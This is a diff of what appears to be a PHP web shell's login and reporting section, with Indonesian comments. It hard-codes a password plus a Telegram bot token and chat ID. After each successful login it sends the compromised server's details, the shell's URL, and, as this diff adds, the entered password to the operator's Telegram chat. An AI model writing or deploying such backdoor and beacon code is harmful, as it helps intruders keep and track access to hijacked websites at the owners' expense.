@@ -4,33 +4,26 @@ session_start();
 error_reporting(0);
 @set_time_limit(0);
 @clearstatcache();
-@ini_set('error_log', null);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
 /* Konfigurasi */
-$aupas = '208becc799e24048a7540fd8417907ec'; // BAPHOMET
-$default_action = 'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-date_default_timezone_set('Asia/Jakarta');
+$correct_password = 'satanas666'; // Password yang benar
+$hashed_password = md5($correct_password); // Hash MD5 dari password
 define('TELEGRAM_BOT_TOKEN', '8035664998:AAEwtMCmxw9g6NaXQaAqsvaPnYJ5-9EJEKQ');
 define('TELEGRAM_CHAT_ID', '7299591453');
 
 // Fungsi untuk mengirim pesan ke Telegram
 function sendTelegramMessage($message) {
     $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
-    file_get_contents($url); // Kirim pesan
+    file_get_contents($url);
 }
 
 // Cek jika ada password yang di-submit
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $input_password = $_POST['password'];
+    $input_password = $_POST['pass']; // Ambil password yang dimasukkan
+    $hashed_input_password = md5($input_password); // Hash MD5 dari password yang dimasukkan
 
-    // Pastikan Anda mendefinisikan $correct_password di suatu tempat
-    if ($input_password === $correct_password) {
+    if ($hashed_input_password === $hashed_password) {
         // Cek apakah pesan sudah dikirim dalam sesi ini
         if (!isset($_SESSION['message_sent'])) {
             // Ambil informasi keberadaan bot
@@ -39,7 +32,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
 
             // Buat pesan
-            $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
+            $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url . "\nPassword yang digunakan: " . $input_password;
 
             // Kirim pesan
             sendTelegramMessage($message);
